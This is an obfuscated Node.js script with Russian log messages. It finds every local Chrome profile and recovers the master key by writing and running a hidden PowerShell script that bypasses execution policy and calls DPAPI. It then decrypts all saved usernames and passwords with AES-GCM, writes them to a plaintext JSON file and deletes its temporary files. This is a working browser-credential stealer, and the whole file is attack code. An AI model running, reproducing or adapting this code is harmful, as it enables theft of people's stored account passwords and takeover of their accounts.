const _0x3afe3b=_0x5183;(function(_0x486122,_0x1b306f){const _0x40a185=_0x5183,_0x239f21=_0x486122();while(!![]){try{const _0x3811a2=-parseInt(_0x40a185(0xda))/0x1*(parseInt(_0x40a185(0xab))/0x2)+parseInt(_0x40a185(0x9a))/0x3+parseInt(_0x40a185(0x98))/0x4+-parseInt(_0x40a185(0xb5))/0x5+parseInt(_0x40a185(0x83))/0x6*(-parseInt(_0x40a185(0xa4))/0x7)+-parseInt(_0x40a185(0x8f))/0x8+-parseInt(_0x40a185(0xe3))/0x9*(-parseInt(_0x40a185(0xb3))/0xa);if(_0x3811a2===_0x1b306f)break;else _0x239f21['push'](_0x239f21['shift']());}catch(_0x2f54a0){_0x239f21['push'](_0x239f21['shift']());}}}(_0x2c1f,0xa273a));const fs=require('fs'),path=require(_0x3afe3b(0xa5)),os=require('os'),crypto=require(_0x3afe3b(0x8d)),{exec}=require('child_process'),sqlite3=require(_0x3afe3b(0xaa))[_0x3afe3b(0xdf)](),util=require(_0x3afe3b(0x96)),execPromise=util[_0x3afe3b(0xc2)](exec),CHROME_USER_DATA_PATH=path[_0x3afe3b(0xe6)]('C:',_0x3afe3b(0xb8),_0x3afe3b(0xbc),'AppData',_0x3afe3b(0xe4),_0x3afe3b(0xd9),_0x3afe3b(0xa6),'User\x20Data');function findChromeProfiles(){const _0x51d8ab=_0x3afe3b;try{if(!fs[_0x51d8ab(0xeb)](CHROME_USER_DATA_PATH))throw new Error(_0x51d8ab(0xf1)+CHROME_USER_DATA_PATH+'\x20не\x20найдена');const _0x15e06a=fs['readdirSync'](CHROME_USER_DATA_PATH),_0xacfaee=_0x15e06a[_0x51d8ab(0xf0)](_0x4d69bd=>{const _0x1f3712=_0x51d8ab,_0x3ac736=path[_0x1f3712(0xe6)](CHROME_USER_DATA_PATH,_0x4d69bd);return fs[_0x1f3712(0xac)](_0x3ac736)[_0x1f3712(0xd6)]()&&(_0x4d69bd===_0x1f3712(0xe2)||_0x4d69bd['startsWith']('Profile\x20'));}),_0x15a4df=_0xacfaee[_0x51d8ab(0xf0)](_0x234f25=>{const _0x19705e=_0x51d8ab,_0x1e1e67=path['join'](CHROME_USER_DATA_PATH,_0x234f25,_0x19705e(0x9d));return fs[_0x19705e(0xeb)](_0x1e1e67);});return console['log']('Найдено\x20'+_0x15a4df[_0x51d8ab(0xbb)]+'\x20профилей\x20с\x20Login\x20Data'),_0x15a4df;}catch(_0x9e3d07){return console[_0x51d8ab(0xcb)]('Ошибка\x20при\x20поиске\x20профилей\x20Chrome:',_0x9e3d07[_0x51d8ab(0xa3)]),[];}}async function getEncryptionKey(){const _0xa1ff97=_0x3afe3b;try{const _0x4ed70b=path['join'](CHROME_USER_DATA_PATH,_0xa1ff97(0xef));if(!fs[_0xa1ff97(0xeb)](_0x4ed70b))throw new Error(_0xa1ff97(0xdc)+_0x4ed70b);const _0x2b7282=fs[_0xa1ff97(0x9b)](_0x4ed70b,_0xa1ff97(0xa9)),_0x4ef1f0=JSON[_0xa1ff97(0xb7)](_0x2b7282);if(!_0x4ef1f0[_0xa1ff97(0xc4)]||!_0x4ef1f0[_0xa1ff97(0xc4)]['encrypted_key'])throw new Error(_0xa1ff97(0xd5));const _0x21eea5=Buffer['from'](_0x4ef1f0[_0xa1ff97(0xc4)]['encrypted_key'],_0xa1ff97(0xde)),_0x1be843=_0x21eea5[_0xa1ff97(0xd1)](0x5),_0x34f973=os[_0xa1ff97(0xa0)](),_0x282714=path[_0xa1ff97(0xe6)](_0x34f973,_0xa1ff97(0xae)+Math[_0xa1ff97(0x8c)]()[_0xa1ff97(0xd2)](0x24)[_0xa1ff97(0xe8)](0x2,0x8));fs[_0xa1ff97(0x91)](_0x282714,_0x1be843);const _0x16522e=_0xa1ff97(0xad)+_0x282714[_0xa1ff97(0xa1)](/\\/g,'\x5c\x5c')+_0xa1ff97(0x86)+_0x282714+'_decrypted\x27,\x20$decrypted);\x0a\x20\x20\x20\x20\x20\x20\x20\x20Write-Output\x20\x22Decryption\x20successful\x22;\x0a\x20\x20\x20\x20}\x20catch\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20Write-Error\x20\x22Decryption\x20error:\x20$_\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20exit\x201;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20',_0x7361d4=path[_0xa1ff97(0xe6)](_0x34f973,_0xa1ff97(0xbd)+Math[_0xa1ff97(0x8c)]()[_0xa1ff97(0xd2)](0x24)['substring'](0x2,0x8)+_0xa1ff97(0xb0));fs[_0xa1ff97(0x91)](_0x7361d4,_0x16522e);try{await execPromise(_0xa1ff97(0xa8)+_0x7361d4+'\x22');}catch(_0x451287){console[_0xa1ff97(0xcb)](_0xa1ff97(0xce),_0x451287[_0xa1ff97(0xa3)]);throw new Error(_0xa1ff97(0x99));}const _0x1e3c88=_0x282714+_0xa1ff97(0x94);if(!fs['existsSync'](_0x1e3c88))throw new Error(_0xa1ff97(0xb9));const _0x2cf676=fs[_0xa1ff97(0x9b)](_0x1e3c88);try{fs['unlinkSync'](_0x282714),fs[_0xa1ff97(0xed)](_0x1e3c88),fs[_0xa1ff97(0xed)](_0x7361d4);}catch(_0x2b5575){console[_0xa1ff97(0xc0)]('Предупреждение:\x20не\x20удалось\x20удалить\x20временные\x20файлы');}return console[_0xa1ff97(0xcf)](_0xa1ff97(0xdd)),_0x2cf676;}catch(_0x54126c){console[_0xa1ff97(0xcb)](_0xa1ff97(0xb2),_0x54126c[_0xa1ff97(0xa3)]);throw _0x54126c;}}function decryptValue(_0x172127,_0x416d18){const _0x2f9889=_0x3afe3b;try{if(!_0x172127||_0x172127['length']===0x0)return'';const _0xe76237=_0x172127['length']>0x3&&_0x172127[0x0]===0x76&&_0x172127[0x1]===0x31&&_0x172127[0x2]===0x30;if(_0xe76237)try{const _0x38ebb3=_0x172127[_0x2f9889(0xd1)](0x3,0xf),_0x2e0925=_0x172127[_0x2f9889(0xd1)](0xf,-0x10),_0x10bbe3=_0x172127[_0x2f9889(0xd1)](-0x10),_0x3ada1d=crypto[_0x2f9889(0xd3)](_0x2f9889(0x9c),_0x416d18,_0x38ebb3);_0x3ada1d[_0x2f9889(0xc7)](_0x10bbe3);let _0x1a5949=_0x3ada1d[_0x2f9889(0xe9)](_0x2e0925);return _0x1a5949=Buffer[_0x2f9889(0xb6)]([_0x1a5949,_0x3ada1d['final']()]),_0x1a5949[_0x2f9889(0xd2)](_0x2f9889(0xa9));}catch(_0x4e611f){return console[_0x2f9889(0xcb)]('Ошибка\x20расшифровки\x20AES-GCM:\x20'+_0x4e611f[_0x2f9889(0xa3)]),_0x2f9889(0xa2)+_0x4e611f['message']+']';}else return _0x2f9889(0xc9)+_0x172127['toString'](_0x2f9889(0xc5))[_0x2f9889(0xe8)](0x0,0xa)+_0x2f9889(0xca);}catch(_0x42bf20){return console[_0x2f9889(0xcb)](_0x2f9889(0x88)+_0x42bf20[_0x2f9889(0xa3)]),_0x2f9889(0xea)+_0x42bf20[_0x2f9889(0xa3)]+']';}}function chromeTimeToDate(_0x2c94b1){const _0x153afb=_0x3afe3b;if(!_0x2c94b1)return null;const _0x10fb6c=Number(_0x2c94b1),_0x2e0c36=Math[_0x153afb(0xd8)](_0x10fb6c/0x3e8)-0xa9730b66800;if(_0x2e0c36<0x0)return null;return new Date(_0x2e0c36)[_0x153afb(0xf2)]();}function _0x5183(_0x94be2d,_0x3e8c29){const _0x2c1f0e=_0x2c1f();return _0x5183=function(_0x518305,_0x1a17d7){_0x518305=_0x518305-0x82;let _0x201886=_0x2c1f0e[_0x518305];return _0x201886;},_0x5183(_0x94be2d,_0x3e8c29);}async function decryptProfilePasswords(_0x33178a,_0x2a27bb){const _0x23adc8=_0x3afe3b,_0x3eaf11=path[_0x23adc8(0xe6)](CHROME_USER_DATA_PATH,_0x33178a,_0x23adc8(0x9d));if(!fs[_0x23adc8(0xeb)](_0x3eaf11))return console[_0x23adc8(0xcb)](_0x23adc8(0xcc)+_0x33178a),[];const _0x4cda83=os[_0x23adc8(0xa0)](),_0xeec654=path[_0x23adc8(0xe6)](_0x4cda83,_0x23adc8(0xb1)+Math[_0x23adc8(0x8c)]()['toString'](0x24)[_0x23adc8(0xe8)](0x2,0x8));try{fs['copyFileSync'](_0x3eaf11,_0xeec654),console[_0x23adc8(0xcf)]('Файл\x20Login\x20Data\x20для\x20профиля\x20'+_0x33178a+_0x23adc8(0xbe));const _0x3aba81=new sqlite3[(_0x23adc8(0x8b))](_0xeec654),_0x55cba0=util[_0x23adc8(0xc2)](_0x3aba81['all'][_0x23adc8(0xcd)](_0x3aba81)),_0x43f37b=util[_0x23adc8(0xc2)](_0x3aba81[_0x23adc8(0x82)][_0x23adc8(0xcd)](_0x3aba81)),_0x25f48f=await _0x55cba0(_0x23adc8(0xc8)),_0x4448c0=_0x25f48f[_0x23adc8(0x87)](_0x429677=>_0x429677[_0x23adc8(0x8e)]===_0x23adc8(0xd0)),_0x113ccb=_0x25f48f[_0x23adc8(0x87)](_0x55f323=>_0x55f323[_0x23adc8(0x8e)]===_0x23adc8(0x92));if(!_0x4448c0||!_0x113ccb)throw new Error(_0x23adc8(0x89)+_0x33178a+_0x23adc8(0xdb));const _0x111f0a=_0x23adc8(0x97),_0x1a7d7f=await _0x55cba0(_0x111f0a);console[_0x23adc8(0xcf)](_0x23adc8(0x8a)+_0x1a7d7f[_0x23adc8(0xbb)]+'\x20записей\x20паролей\x20в\x20профиле\x20'+_0x33178a);const _0x456c8d=_0x1a7d7f[_0x23adc8(0xe7)](_0x3ccf4f=>{const _0x29c729=_0x23adc8;try{const _0x5ea5f9=Buffer[_0x29c729(0xbf)](_0x3ccf4f[_0x29c729(0x92)]),_0x4f694a=decryptValue(_0x5ea5f9,_0x2a27bb);return{'profile':_0x33178a,'origin_url':_0x3ccf4f[_0x29c729(0x95)],'action_url':_0x3ccf4f['action_url'],'username':_0x3ccf4f['username_value'],'password':_0x4f694a,'date_created':chromeTimeToDate(_0x3ccf4f[_0x29c729(0x85)]),'date_last_used':chromeTimeToDate(_0x3ccf4f[_0x29c729(0xd7)]),'times_used':_0x3ccf4f[_0x29c729(0xc6)]};}catch(_0x2bdcf4){return console[_0x29c729(0xcb)]('Ошибка\x20расшифровки\x20пароля\x20для\x20'+_0x3ccf4f[_0x29c729(0x95)]+_0x29c729(0xba)+_0x33178a+':',_0x2bdcf4['message']),{'profile':_0x33178a,'origin_url':_0x3ccf4f[_0x29c729(0x95)],'action_url':_0x3ccf4f[_0x29c729(0xec)],'username':_0x3ccf4f[_0x29c729(0xd0)],'password':_0x29c729(0xa2)+_0x2bdcf4[_0x29c729(0xa3)]+']','date_created':chromeTimeToDate(_0x3ccf4f[_0x29c729(0x85)]),'date_last_used':chromeTimeToDate(_0x3ccf4f[_0x29c729(0xd7)]),'times_used':_0x3ccf4f[_0x29c729(0xc6)]};}});await _0x43f37b();try{fs['unlinkSync'](_0xeec654),console[_0x23adc8(0xcf)](_0x23adc8(0x9f)+_0x33178a+_0x23adc8(0x9e));}catch(_0xbc4f09){console[_0x23adc8(0xc0)](_0x23adc8(0xd4)+_0x33178a+':\x20'+_0xbc4f09['message']);}return _0x456c8d;}catch(_0x2905cc){console[_0x23adc8(0xcb)](_0x23adc8(0xaf)+_0x33178a+':',_0x2905cc[_0x23adc8(0xa3)]);if(fs[_0x23adc8(0xeb)](_0xeec654))try{fs[_0x23adc8(0xed)](_0xeec654);}catch(_0x3e9149){console[_0x23adc8(0xc0)]('Не\x20удалось\x20удалить\x20временный\x20файл\x20для\x20профиля\x20'+_0x33178a+':\x20'+_0x3e9149['message']);}return[];}}async function decryptAllProfilesPasswords(){const _0x384114=_0x3afe3b;try{const _0x484ac8=findChromeProfiles();if(_0x484ac8[_0x384114(0xbb)]===0x0)return console[_0x384114(0xcf)]('Не\x20найдено\x20профилей\x20с\x20файлами\x20Login\x20Data'),null;const _0x54db50=await getEncryptionKey();let _0x4b0eea=[];for(const _0xbac937 of _0x484ac8){console[_0x384114(0xcf)](_0x384114(0x93)+_0xbac937);const _0x54172e=await decryptProfilePasswords(_0xbac937,_0x54db50);_0x4b0eea=_0x4b0eea[_0x384114(0xb6)](_0x54172e);}_0x4b0eea[_0x384114(0xee)]((_0x42b8f3,_0x5bedfd)=>{const _0x4f4adb=_0x384114;if(_0x5bedfd['times_used']!==_0x42b8f3[_0x4f4adb(0xc6)])return _0x5bedfd[_0x4f4adb(0xc6)]-_0x42b8f3['times_used'];if(_0x42b8f3[_0x4f4adb(0xd7)]&&_0x5bedfd[_0x4f4adb(0xd7)])return new Date(_0x5bedfd[_0x4f4adb(0xd7)])-new Date(_0x42b8f3[_0x4f4adb(0xd7)]);return 0x0;});const _0x5934cc=_0x384114(0xa7);return fs[_0x384114(0x91)](_0x5934cc,JSON[_0x384114(0xe1)](_0x4b0eea,null,0x2),'utf8'),console[_0x384114(0xcf)]('\x0aВсе\x20расшифрованные\x20пароли\x20('+_0x4b0eea['length']+_0x384114(0x84)+_0x5934cc),{'count':_0x4b0eea[_0x384114(0xbb)],'outputPath':_0x5934cc,'profiles':_0x484ac8,'passwords':_0x4b0eea};}catch(_0x3d8d98){console[_0x384114(0xcb)](_0x384114(0xc1),_0x3d8d98[_0x384114(0xa3)]);throw _0x3d8d98;}}async function main(){const _0x294796=_0x3afe3b;try{console[_0x294796(0xcf)](_0x294796(0x90));const _0x3f86f4=await decryptAllProfilesPasswords();return console['log'](_0x294796(0xb4)),_0x3f86f4;}catch(_0x37e2bb){console['error'](_0x294796(0xc3),_0x37e2bb[_0x294796(0xa3)]),process[_0x294796(0xe5)](0x1);}}function _0x2c1f(){const _0x1c59cb=['sort','Local\x20State','filter','Директория\x20','toISOString','close','6tSwZFZ',')\x20сохранены\x20в\x20файл:\x20','date_created','\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20$decrypted\x20=\x20[System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes,\x20$null,\x20\x27CurrentUser\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20[System.IO.File]::WriteAllBytes(\x27','some','Ошибка\x20при\x20расшифровке\x20значения:\x20','В\x20таблице\x20logins\x20профиля\x20','Найдено\x20','Database','random','crypto','name','1122360LXaSrx','=====\x20Расшифровка\x20паролей\x20Chrome\x20из\x20всех\x20профилей\x20=====','writeFileSync','password_value','\x0aОбработка\x20профиля:\x20','_decrypted','origin_url','util','\x0a\x20\x20\x20\x20\x20\x20SELECT\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20origin_url,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20action_url,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20username_value,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20password_value,\x0a\x20\x20\x20\x20\x20\x20\x20\x20date_created,\x0a\x20\x20\x20\x20\x20\x20\x20\x20date_last_used,\x0a\x20\x20\x20\x20\x20\x20\x20\x20times_used\x0a\x20\x20\x20\x20\x20\x20FROM\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20logins\x0a\x20\x20\x20\x20\x20\x20ORDER\x20BY\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20times_used\x20DESC,\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20date_last_used\x20DESC\x0a\x20\x20\x20\x20','784840cnMHnj','Ошибка\x20выполнения\x20PowerShell\x20скрипта','3456495ywcUAj','readFileSync','aes-256-gcm','Login\x20Data','\x20удален','Временный\x20файл\x20для\x20профиля\x20','tmpdir','replace','[Ошибка\x20расшифровки:\x20','message','679511SfslmJ','path','Chrome','chrome_passwords_result.json','powershell\x20-ExecutionPolicy\x20Bypass\x20-File\x20\x22','utf8','sqlite3','21356PRXvfT','statSync','\x0a\x20\x20\x20\x20Add-Type\x20-AssemblyName\x20System.Security;\x0a\x20\x20\x20\x20try\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20$encryptedBytes\x20=\x20[System.IO.File]::ReadAllBytes(\x27','chrome_key_encrypted_','Ошибка\x20при\x20расшифровке\x20паролей\x20профиля\x20','.ps1','chrome_login_data_temp_','Ошибка\x20при\x20получении\x20ключа\x20шифрования:','136630IrMyQu','\x0a=====\x20Расшифровка\x20завершена\x20=====','3939905VVVSXn','concat','parse','Users','Не\x20удалось\x20создать\x20файл\x20с\x20расшифрованным\x20ключом','\x20в\x20профиле\x20','length','user','decrypt_chrome_key_','\x20скопирован\x20во\x20временную\x20директорию','from','warn','Ошибка\x20при\x20расшифровке\x20паролей\x20из\x20всех\x20профилей:','promisify','Критическая\x20ошибка:','os_crypt','hex','times_used','setAuthTag','PRAGMA\x20table_info(logins)','[Encrypted-Legacy:\x20','...]','error','Файл\x20Login\x20Data\x20не\x20найден\x20для\x20профиля\x20','bind','PowerShell\x20error:','log','username_value','slice','toString','createDecipheriv','Не\x20удалось\x20удалить\x20временный\x20файл\x20для\x20профиля\x20','Не\x20удалось\x20найти\x20encrypted_key\x20в\x20Local\x20State','isDirectory','date_last_used','floor','Google','14sQTOfi','\x20отсутствуют\x20необходимые\x20столбцы','Файл\x20Local\x20State\x20не\x20найден\x20по\x20пути:\x20','Ключ\x20шифрования\x20успешно\x20получен','base64','verbose','catch','stringify','Default','324LTdnAC','Local','exit','join','map','substring','update','[Ошибка:\x20','existsSync','action_url','unlinkSync'];_0x2c1f=function(){return _0x1c59cb;};return _0x2c1f();}main()[_0x3afe3b(0xe0)](_0x411450=>{const _0x3fd5da=_0x3afe3b;console['error']('Необработанная\x20ошибка:',_0x411450),process[_0x3fd5da(0xe5)](0x1);});
